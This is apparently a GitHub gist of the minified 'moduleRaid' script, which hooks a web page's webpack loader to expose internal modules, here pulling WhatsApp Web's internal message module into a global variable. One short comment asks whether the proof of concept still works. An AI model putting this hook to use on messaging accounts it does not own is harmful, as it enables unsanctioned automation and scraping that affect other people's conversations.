!function(){const o=function(e){o.mID=Math.random().toString(36).substring(7);o.mObj={};o.cArr=[];o.mGet=null;e?o.debug=!0:window.mRdebug?o.debug=!0:o.debug=!1;o.log=function(e){o.debug&&console.warn(`[moduleRaid] ${e}`)};o.args=[[[0],[function(e,n,t){mCac=t.c;Object.keys(mCac).forEach(function(e){o.mObj[e]=mCac[e].exports});o.cArr=t.m;o.mGet=t}]],[[1e3],{[o.mID]:function(e,n,t){mCac=t.c;Object.keys(mCac).forEach(function(e){o.mObj[e]=mCac[e].exports});o.cArr=t.m;o.mGet=t}},[[o.mID]]]];fillModuleArray=function(){if("function"==typeof webpackJsonp)o.args.forEach(function(e,n){try{webpackJsonp(...e)}catch(e){o.log(`moduleRaid.args[${n}] failed: ${e}`)}});else try{webpackJsonp.push(o.args[1])}catch(e){o.log(`Pushing moduleRaid.args[1] into webpackJsonp failed: ${e}`)}if(0==o.mObj.length){mEnd=!1;mIter=0;if(!webpackJsonp([],[],[mIter]))throw Error("Unknown Webpack structure");for(;!mEnd;)try{o.mObj[mIter]=webpackJsonp([],[],[mIter]);mIter++}catch(o){mEnd=!0}}};fillModuleArray();get=function(e){return o.mObj[e]};findModule=function(e){results=[];modules=Object.keys(o.mObj);modules.forEach(function(n){mod=o.mObj[n];if("undefined"!=typeof mod){if("object"==typeof mod.default)for(key in mod.default)key==e&&results.push(mod);for(key in mod)key==e&&results.push(mod)}});return results};findFunction=function(e){if(0==o.cArr.length)throw Error("No module constructors to search through!");results=[];if("string"==typeof e)o.cArr.forEach(function(n,t){n.toString().includes(e)&&results.push(o.mObj[t])});else{if("function"!=typeof e)throw new TypeError("findFunction can only find via string and function, "+typeof e+" was passed");modules=Object.keys(o.mObj);modules.forEach(function(n,t){mod=o.mObj[n];e(mod)&&results.push(o.mObj[t])})}return results};return{modules:o.mObj,constructors:o.cArr,findModule:findModule,findFunction:findFunction,get:o.mGet?o.mGet:get}};"object"==typeof module&&module.exports?module.exports=o:window.mR=o();

window.Msg=window.mR.findModule("Msg")[0].default}();
@susi-gif susi-gif commented on 15 Nov 2020
POCWAPP still work now..?


Leave a comment
© 2021 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
